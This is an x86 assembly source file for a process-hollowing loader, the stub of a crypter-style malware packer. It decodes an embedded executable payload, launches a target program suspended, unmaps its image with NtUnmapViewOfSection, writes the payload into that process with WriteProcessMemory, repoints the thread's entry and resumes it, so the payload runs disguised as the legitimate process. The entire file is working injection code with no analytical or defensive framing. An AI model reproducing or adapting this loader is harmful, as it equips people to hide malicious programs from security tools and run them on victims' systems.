%define HIMEM 				0x00800000 + BASE

str_appname:	db APPNAME,0
str_ntdll:	db 'ntdll',0
str_reloc:	db '.reloc'

%define lpProcessInformation		HIMEM + 0x4000
%define hProcess			lpProcessInformation
%define hThread				lpProcessInformation + 4
%define dwProcessId			lpProcessInformation + 8
%define dwThreadId			lpProcessInformation + 12
%define mThreadContext			dwThreadId + 4
%define mThreadContextEbx		mThreadContext + 164
%define mThreadContextEax		mThreadContext + 176
%define mRemoteImageBase		mThreadContext + 716

str_CreateProcessA: 			db 'CreateProcessA',0 
str_GetThreadContext: 			db 'GetThreadContext',0 
str_ReadProcessMemory: 			db 'ReadProcessMemory',0 
str_VirtualAllocEx: 			db 'VirtualAllocEx',0 
str_WriteProcessMemory: 		db 'WriteProcessMemory',0 
str_SetThreadContext: 			db 'SetThreadContext',0 
str_ResumeThread: 			db 'ResumeThread',0 
str_WaitForSingleObject: 		db 'WaitForSingleObject',0 
str_NtUnmapViewOfSection:		db 'NtUnmapViewOfSection',0 

%define CreateProcessA			HIMEM + 0x8000
%define GetThreadContext		CreateProcessA + 4
%define ReadProcessMemory		GetThreadContext + 4
%define VirtualAllocEx			ReadProcessMemory + 4
%define WriteProcessMemory		VirtualAllocEx + 4
%define SetThreadContext		WriteProcessMemory + 4
%define ResumeThread			SetThreadContext + 4
%define WaitForSingleObject		ResumeThread + 4
%define NtUnmapViewOfSection		WaitForSingleObject + 4

%macro IMPORT 1
	mov edx, %1
	push edx
	push ebx
	call [GetProcAddress]
	stosd	
%endmacro




;; ==== Actual code goes here ====
_main:
	lea si, __data
	lea di, __end
	mov ebx, [__datasize]
decode:
	lodsb
	stosb
	dec ebx
	cmp ebx, 0
	jg decode

ImportFunctions:	
	lea edi, CreateProcessA		; Load target for finction calls into destination register
					; so we can store the calls with a simple stosd instruction

	push __kernel32			; Load Kernel32 module handle
	call [LoadLibraryA]
	mov ebx, eax			; ebx = module handle

	IMPORT str_CreateProcessA
	IMPORT str_GetThreadContext
	IMPORT str_ReadProcessMemory
	IMPORT str_VirtualAllocEx
	IMPORT str_WriteProcessMemory
	IMPORT str_SetThreadContext
	IMPORT str_ResumeThread
	IMPORT str_WaitForSingleObject

	push str_ntdll			; Load Ntdll module handle
	call [LoadLibraryA]
	mov ebx, eax 			; ebx = module handle

	IMPORT str_NtUnmapViewOfSection

CreateProcess:
	xor eax, eax			; Zero eax because 'push eax' is smaller than 'push 0'
	push lpProcessInformation
	push HIMEM
	push eax			; 0
	push eax			; 0
	push 4				; Create suspended
	push eax			; 0
	push eax			; 0
	push eax			; 0
	push str_appname
	push eax			; 0
	call [CreateProcessA]

	
	mov byte [mThreadContext], 7	; Read thread context so se can determine the
	push mThreadContext		; newly spawned process' base address. 7 means
	push dword [hThread]		; CONTEXT_FULL
	call [GetThreadContext]

	mov eax, dword [mThreadContextEbx] ; Determine base address by reading target process memory
	add eax, 8			; The base address is stored at ebx + 8 in the target process'
	push 0				; address space, so we add that to the calue of ebx
	push 4
	push mRemoteImageBase
	push eax
	push dword [hProcess]
	call [ReadProcessMemory]

	push dword [mRemoteImageBase]	; Unmap the target process executable from memory
	push dword [hProcess]
	call [NtUnmapViewOfSection]

	push 0x40			; PAGE_EXECUTE_READWRITE
	push 0x00003000			; MEM_COMMIT | MEM_RESERVE
	push dword [ImageSize]		; Alloc size
	push dword [mRemoteImageBase]
	push dword [hProcess]
	call [VirtualAllocEx]

	mov eax, [__end + 0x3c] 	; Move offset of PE header start into eax
	add eax, __end			; Now points to PE header start
	

	mov ebx, [eax + 0xA0]		; Check if payload image has relocations
	cmp ebx, 0
	jnz _hasRelocNope		; Nope, not touching images with dynamic 
					; base address! Recompile that shit without
					; relocations first

	mov ebx, [eax + 0x34]		; Base address of payload image
	mov ecx, [mRemoteImageBase]
	mov [eax + 0x34], ecx		; Update payload base address
	sub ecx, ebx			; ecx holds image base delta 
	mov ebx, [eax + 0x54]		; Size of payload headers

	push eax			; Save eax because we need it again!
					; Woule be better stored in a different 
					; register than the one used for 
					; return values, probably...
	push 0
	push ebx
	push __end
	push dword [mRemoteImageBase]
	push dword [hProcess]
	call [WriteProcessMemory]

	pop eax				; Resore that fucker

	mov bx, [eax + 0x06]		; number of sections
	mov ecx, eax
	add ecx, 0xF8			; move pointer to first section header
	mov edx, [mRemoteImageBase]

copySection:				; Copy over all sections to the target
	call copysec
	dec ebx
	add ecx, 40	
	cmp ebx, 0
	jg copySection

	mov eax, [__end + 0x3c] 	; Move offset of PE header start into eax
	add eax, __end			; Now points to PE header start
	mov ebx, [mRemoteImageBase]	; Image base of payload
	add ebx, [eax + 0x28]		; Move pointer forward so the entry point is correct
	mov [mThreadContextEax], ebx	; Update eax in the target thread context
	
	push mThreadContext		; Update the thread context in the target
	push dword [hThread]		; thread so we can resume execution
	call [SetThreadContext]

	push dword [hThread]
	call [ResumeThread]		; Magic

	push 0xffffffff
	push dword [hThread]
	call [WaitForSingleObject]

_hasRelocNope:
	ret

; ecx: section header
; edx: remote base address
; Can probably be made smaller too
copysec:
	pusha
	add ecx, 12
	add edx, [ecx]
	add ecx, 4
	push 0
	push dword [ecx]
	add ecx, 4
	mov eax, [ecx]
	add eax, __end
	push eax
	push edx
	push dword [hProcess]
	call [WriteProcessMemory]
	popa
	ret
